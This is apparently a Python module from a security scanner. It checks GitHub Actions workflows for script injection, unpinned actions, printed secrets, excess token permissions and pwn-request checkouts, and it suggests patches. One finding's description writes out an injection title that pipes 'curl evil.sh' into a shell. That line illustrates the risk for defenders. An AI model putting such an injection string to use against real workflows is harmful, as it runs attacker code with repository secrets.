"""Risky GitHub Actions configuration."""
from __future__ import annotations

import re
from pathlib import Path

import yaml

from .files import read_text
from .models import Finding, Severity

SHA = re.compile(r"[0-9a-f]{40}")
FIRST_PARTY = {"actions", "github"}

# Contexts an outside contributor controls (GitHub docs: "Security hardening for GitHub Actions").
UNTRUSTED = re.compile(
    r"\$\{\{[^}]*?\b("
    r"github\.event\.(?:issue\.(?:title|body)"
    r"|pull_request\.(?:title|body|head\.ref|head\.label|head\.repo\.default_branch)"
    r"|comment\.body|review\.body|review_comment\.body|discussion\.(?:title|body)"
    r"|pages\.[\w*\[\]]+\.page_name|commits\.[\w*\[\]]+\.(?:message|author\.(?:email|name))"
    r"|head_commit\.(?:message|author\.(?:email|name)|committer\.(?:email|name))"
    r"|workflow_run\.(?:head_branch|display_title|head_commit\.(?:message|author\.(?:email|name))))"
    r"|github\.head_ref)\b[^}]*\}\}")
INPUTS = re.compile(r"\$\{\{[^}]*?\b((?:github\.event\.)?inputs\.[\w-]+)[^}]*\}\}")
SECRET_EXPR = re.compile(r"\$\{\{\s*secrets\.[\w-]+\s*\}\}")
PRINTS = re.compile(r"(?:^|[\s;&(])(?:echo|printf|cat|print|Write-Host|Write-Output)\b")
PR_HEAD = re.compile(r"github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref|github\.event\.workflow_run\.head_(?:sha|branch)"
                     r"|refs/pull/")


def env_var_for(context: str) -> str:
    """github.event.issue.title -> ISSUE_TITLE, github.event.pull_request.head.ref -> PR_HEAD_REF."""
    parts = [p for p in re.split(r"[.\[\]*]+", context) if p and p not in ("github", "event")]
    parts = ["PR" if p == "pull_request" else p for p in parts]
    if parts and parts[0] == "inputs":
        parts = parts[1:] + ["input"]
    name = "_".join(parts[-3:]) if len(parts) > 3 else "_".join(parts)
    return re.sub(r"[^A-Za-z0-9]+", "_", name).strip("_").upper() or "VALUE"


class LineLoader(yaml.SafeLoader):
    """SafeLoader that records each mapping's line number under '__line__'."""


def _construct_mapping(loader, node):
    mapping = yaml.SafeLoader.construct_mapping(loader, node, deep=True)
    mapping["__line__"] = node.start_mark.line + 1
    return mapping


LineLoader.add_constructor(yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, _construct_mapping)


def items(d):
    return [(k, v) for k, v in (d or {}).items() if k != "__line__"] if isinstance(d, dict) else []


def triggers(data: dict) -> set[str]:
    on = data.get("on", data.get(True))      # YAML 1.1 reads a bare `on` key as True
    if isinstance(on, str):
        return {on}
    if isinstance(on, list):
        return {str(x) for x in on}
    return {str(k) for k, _ in items(on)}


def find_line(lines: list[str], start: int, needle: str, limit: int = 400) -> int:
    for i in range(max(start - 1, 0), min(len(lines), start - 1 + limit)):
        if needle in lines[i]:
            return i + 1
    return start


def key_line(lines: list[str], start: int, key: str) -> int:
    pat = re.compile(rf"^\s*(?:-\s+)?{re.escape(key)}\s*:")
    for i in range(max(start - 1, 0), min(len(lines), start + 60)):
        if pat.match(lines[i]):
            return i + 1
    return start


def is_false(value) -> bool:
    return value is False or str(value).strip().lower() in ("false", "no", "off", "0")


class Checker:
    def __init__(self, rel: str, text: str):
        self.rel, self.text, self.lines = rel, text, text.splitlines()
        self.findings: list[Finding] = []

    def add(self, rule, sev, title, line, description, fix, evidence="", patch=None, details=None):
        self.findings.append(Finding(rule=f"workflow/{rule}", category="workflows", severity=sev,
                                     title=title, file=self.rel, line=line, description=description,
                                     fix=fix, evidence=evidence.strip()[:160], patch=patch, details=details or {}))

    # -- patch helpers -------------------------------------------------------
    @staticmethod
    def indent_of(text: str) -> int:
        return len(text) - len(text.lstrip(" "))

    def step_block(self, line: int) -> tuple[int, int]:
        """0-based [start, end) of the list item (step) that contains `line`."""
        i = max(line - 1, 0)
        while i > 0 and not self.lines[i].lstrip().startswith("- "):
            i -= 1
        dash = self.indent_of(self.lines[i])
        j = i + 1
        while j < len(self.lines):
            t = self.lines[j]
            if t.strip() and self.indent_of(t) <= dash:
                break
            j += 1
        while j > i + 1 and not self.lines[j - 1].strip():
            j -= 1
        return i, j

    def block_patch(self, start: int, end: int, new_lines: list[str], limit: int = 30) -> dict | None:
        before = self.lines[start:end]
        if before == new_lines or len(before) > limit:
            return None
        return {"start": start + 1, "before": before, "after": new_lines}

    def env_patch(self, line: int, expr: str, var: str, replacement: str) -> dict | None:
        """Move `${{ expr }}` into the step's env: block and reference it as a variable."""
        start, end = self.step_block(line)
        block = self.lines[start:end]
        dash = self.indent_of(block[0])
        key_indent = " " * (dash + 2)
        pattern = re.compile(r"\$\{\{\s*" + re.escape(expr) + r"\s*\}\}")

        js = replacement.startswith("process.env.")
        quoted_exact = re.compile(r"""(["'`])\$\{\{\s*""" + re.escape(expr) + r"""\s*\}\}\1""")

        def swap(text: str) -> str:
            if js:
                text = quoted_exact.sub(replacement, text)

            def one(m):
                before = text[: m.start()]
                if js:
                    quotes = [(before.rfind(q), q) for q in "\"'`"]
                    pos, q = max(quotes)
                    if pos == -1 or before.count(q) % 2 == 0:
                        return replacement
                    return "${" + replacement + "}" if q == "`" else f"{q} + {replacement} + {q}"
                return replacement if before.endswith('"') or before.count('"') % 2 == 1 else f'"{replacement}"'
            return pattern.sub(one, text)

        new = []
        env_at = None
        for idx, text in enumerate(block):
            stripped = text.strip()
            if re.match(r"^(?:-\s+)?env\s*:\s*$", stripped) and self.indent_of(text) in (dash, dash + 2):
                env_at = idx
            new.append(text if re.match(r"^(?:-\s+)?env\s*:", stripped) else swap(text))
        entry = f"{var}: ${{{{ {expr} }}}}"
        if env_at is not None:
            child = " " * (self.indent_of(block[env_at]) + (4 if block[env_at].lstrip().startswith("- ") else 2))
            new.insert(env_at + 1, child + entry)
        else:
            new += [key_indent + "env:", key_indent + "  " + entry]
        return self.block_patch(start, end, new)

    def evidence(self, line: int) -> str:
        return self.lines[line - 1] if 0 < line <= len(self.lines) else ""

    # -- rules -------------------------------------------------------------
    def check_uses(self, uses: str, line: int) -> None:
        uses = str(uses).strip()
        if uses.startswith(("./", ".\\")):
            return
        ln = find_line(self.lines, line, uses)
        if uses.startswith("docker://"):
            if "@sha256:" not in uses:
                self.add("unpinned-action", Severity.MEDIUM, f"Docker image `{uses}` is not pinned by digest", ln,
                         "Image tags can be re-pushed, so the code this step runs can change without any change to your repo.",
                         "Pin the image by digest: `docker://image@sha256:<digest>`.", self.evidence(ln))
            return
        name, _, ref = uses.partition("@")
        owner = name.split("/")[0].lower()
        if ref and SHA.fullmatch(ref):
            return
        sev = Severity.LOW if owner in FIRST_PARTY else Severity.MEDIUM
        repo = "/".join(name.split("/")[:2])
        who = "GitHub's own action" if owner in FIRST_PARTY else "a third-party action"
        desc = (f"`{uses}` uses {who} by a {'tag or branch' if ref else 'default branch (no version at all)'}. "
                "Tags and branches can be moved to different code, so if the action's repository is compromised "
                "your workflow silently runs the attacker's code with access to your secrets. That's what happened "
                "in the March 2025 tj-actions/changed-files compromise: its version tags were moved to malicious "
                "code that dumped CI secrets into build logs. A full commit SHA is the only immutable reference.")
        fix = (f"Pin to the commit SHA and keep the version as a comment: `uses: {name}@<40-char-sha> # {ref or 'version'}`. "
               f"Get the SHA with `git ls-remote https://github.com/{repo} refs/tags/{ref or '<tag>'}`. "
               "Dependabot (package-ecosystem: github-actions) keeps pinned SHAs up to date.")
        self.add("unpinned-action", sev, f"Action `{uses}` is not pinned to a commit SHA", ln, desc, fix, self.evidence(ln),
                 details={"action": name, "repo": repo, "ref": ref, "line_text": self.evidence(ln)})

    def check_script(self, script: str, line: int, where: str) -> None:
        github_script = where == "github-script"
        for m in UNTRUSTED.finditer(script):
            ln = find_line(self.lines, line, m.group(0))
            expr = re.search(r"\$\{\{\s*(.*?)\s*\}\}", m.group(0)).group(1)
            var = env_var_for(m.group(1))
            patch = self.env_patch(ln, expr, var, f"process.env.{var}" if github_script else f"${var}")
            self.add("script-injection", Severity.HIGH,
                     f"Untrusted `{m.group(1)}` is inserted directly into a {where}", ln,
                     f"`{m.group(1)}` is controlled by whoever opens the issue, PR or commit. GitHub pastes "
                     "`${{ }}` expressions into the script before it runs, so a title like "
                     "`\"; curl evil.sh | sh; #` runs as code on your runner, with your token and secrets.",
                     "Pass it through an environment variable and quote it: "
                     f"`env: VALUE: ${{{{ {m.group(1)} }}}}` then use `\"$VALUE\"` in the script.",
                     self.evidence(ln), patch=patch, details={"expression": m.group(1)})
        for m in INPUTS.finditer(script):
            ln = find_line(self.lines, line, m.group(0))
            expr = re.search(r"\$\{\{\s*(.*?)\s*\}\}", m.group(0)).group(1)
            var = env_var_for(m.group(1))
            ipatch = self.env_patch(ln, expr, var, f"process.env.{var}" if github_script else f"${var}")
            self.add("input-injection", Severity.LOW,
                     f"Workflow input `{m.group(1)}` is inserted directly into a {where}", ln,
                     "Inputs come from whoever triggers the workflow. Only people with write access can do that, "
                     "but a value containing quotes or `;` still runs as code.",
                     f"Use an environment variable: `env: VALUE: ${{{{ {m.group(1)} }}}}` then `\"$VALUE\"`.",
                     self.evidence(ln), patch=ipatch, details={"expression": m.group(1)})
        for offset, text in enumerate(script.splitlines()):
            if SECRET_EXPR.search(text) and PRINTS.search(text) and "add-mask" not in text \
                    and "|" not in text and ">" not in text:
                ln = find_line(self.lines, line, text.strip())
                self.add("secret-printed", Severity.MEDIUM, "A secret is printed in a run step", ln,
                         "GitHub masks known secret values in logs, but masking fails as soon as the value is "
                         "transformed (base64, split, JSON-escaped), and anyone with read access can see logs.",
                         "Don't print secrets. Pass them to commands through environment variables.",
                         self.evidence(ln))

    def check_permissions(self, data: dict, jobs: list) -> None:
        top = data.get("permissions")
        jobs_line = key_line(self.lines, 1, "jobs")
        if top == "write-all":
            ln = key_line(self.lines, 1, "permissions")
            self.add("write-all", Severity.HIGH, "Workflow grants `write-all` permissions", ln,
                     "Every job gets write access to code, releases, packages and more. Any compromised step can push code.",
                     "Replace with the minimum needed, e.g. `permissions: { contents: read }`.", self.evidence(ln),
                     patch=self.write_all_patch(ln))
        for jid, job in jobs:
            if isinstance(job, dict) and job.get("permissions") == "write-all":
                ln = key_line(self.lines, job.get("__line__", 1), "permissions")
                self.add("write-all", Severity.HIGH, f"Job `{jid}` grants `write-all` permissions", ln,
                         "This job gets write access to everything the token can reach.",
                         "Grant only the scopes the job uses, e.g. `contents: read`.", self.evidence(ln),
                         patch=self.write_all_patch(ln))
        if top is None:
            loose = [jid for jid, job in jobs if isinstance(job, dict) and "permissions" not in job]
            if loose:
                self.add("missing-permissions", Severity.MEDIUM, "Workflow doesn't limit GITHUB_TOKEN permissions",
                         jobs_line,
                         f"No `permissions:` block at the top or on job(s) {', '.join(f'`{j}`' for j in loose)}. "
                         "They get the repository's default token scope, which on many repos and organisations "
                         "is read/write to contents, issues, packages and more.",
                         "Add a top-level `permissions:` block with `contents: read`, and grant extra scopes "
                         "only on the jobs that need them.",
                         patch={"start": jobs_line, "before": [self.evidence(jobs_line)],
                                "after": ["permissions:", "  contents: read", "", self.evidence(jobs_line)]}
                         if self.evidence(jobs_line).startswith("jobs") else None)

    def write_all_patch(self, ln: int) -> dict | None:
        text = self.evidence(ln)
        if "write-all" not in text:
            return None
        pad = " " * self.indent_of(text)
        return {"start": ln, "before": [text], "after": [pad + "permissions:", pad + "  contents: read"]}

    def persist_patch(self, line: int) -> dict | None:
        start, end = self.step_block(line)
        block = self.lines[start:end]
        dash = self.indent_of(block[0])
        new = list(block)
        for idx, text in enumerate(block):
            if re.match(r"^\s*(?:-\s+)?with\s*:\s*$", text):
                child = " " * (self.indent_of(text) + (4 if text.lstrip().startswith("- ") else 2))
                new.insert(idx + 1, child + "persist-credentials: false")
                break
        else:
            new += [" " * (dash + 2) + "with:", " " * (dash + 4) + "persist-credentials: false"]
        return self.block_patch(start, end, new)

    def check_checkout(self, step: dict, events: set[str]) -> None:
        with_ = step.get("with") or {}
        line = step.get("__line__", 1)
        ref = str(with_.get("ref", ""))
        if events & {"pull_request_target", "workflow_run"} and PR_HEAD.search(ref):
            ln = find_line(self.lines, line, "ref")
            self.add("pwn-request", Severity.CRITICAL,
                     "Pull request code is checked out in a privileged workflow", ln,
                     "`pull_request_target` and `workflow_run` run with your secrets and a write token. Checking "
                     "out the PR's code there and building or testing it lets anyone with a fork run code "
                     "with those privileges (a \"pwn request\").",
                     "Use the `pull_request` trigger for building untrusted code. If you need privileges, split "
                     "it into an unprivileged `pull_request` build and a separate privileged job that only "
                     "consumes its artifacts.", self.evidence(ln))
        if not is_false(with_.get("persist-credentials", True)):
            ln = find_line(self.lines, line, "checkout")
            self.add("persist-credentials", Severity.LOW, "Checkout leaves the GitHub token on disk", ln,
                     "`actions/checkout` saves the token in `.git/config` by default, where every later step "
                     "(and anything that uploads the workspace as an artifact) can read it.",
                     "Add `with: persist-credentials: false` unless a later step needs to push with git.",
                     self.evidence(ln), patch=self.persist_patch(ln))

    # -- driver -----------------------------------------------------------
    def run(self) -> list[Finding]:
        data = yaml.load(self.text, Loader=LineLoader)
        if not isinstance(data, dict):
            return []
        is_action = "runs" in data and "jobs" not in data
        events = triggers(data)
        if is_action:
            steps_by_job = [("action", (data.get("runs") or {}).get("steps") or [])]
            jobs = []
        else:
            jobs = items(data.get("jobs"))
            steps_by_job = []
            for jid, job in jobs:
                if not isinstance(job, dict):
                    continue
                if job.get("uses"):
                    self.check_uses(job["uses"], job.get("__line__", 1))
                steps_by_job.append((jid, job.get("steps") or []))
            self.check_permissions(data, jobs)
        for _, steps in steps_by_job:
            for step in steps:
                if not isinstance(step, dict):
                    continue
                line = step.get("__line__", 1)
                uses = str(step.get("uses") or "")
                if uses:
                    self.check_uses(uses, line)
                    if uses.split("@")[0].lower() == "actions/checkout":
                        self.check_checkout(step, events)
                    if uses.split("@")[0].lower() == "actions/github-script":
                        self.check_script(str((step.get("with") or {}).get("script", "")), line, "github-script")
                if step.get("run"):
                    self.check_script(str(step["run"]), line, "`run` script")
        return self.findings


def find_workflow_files(files: list[str]) -> list[str]:
    out = []
    for rel in files:
        if re.fullmatch(r"\.github/workflows/[^/]+\.ya?ml", rel) or rel in ("action.yml", "action.yaml") \
                or re.fullmatch(r"\.github/actions/[^/]+/action\.ya?ml", rel):
            out.append(rel)
    return sorted(out)


def scan(root: Path, files: list[str]) -> tuple[list[Finding], dict, list[str]]:
    findings, notes = [], []
    targets = find_workflow_files(files)
    for rel in targets:
        try:
            text = read_text(root / rel, root)
            if text is None:
                notes.append(f"Skipped {rel}: it's a symlink, binary or too large.")
                continue
            findings += Checker(rel, text).run()
        except yaml.YAMLError as exc:
            mark = getattr(exc, "problem_mark", None)
            notes.append(f"Couldn't parse {rel}" + (f" (line {mark.line + 1})" if mark else "") + "; skipped it.")
    return findings, {"workflows_scanned": len(targets)}, notes
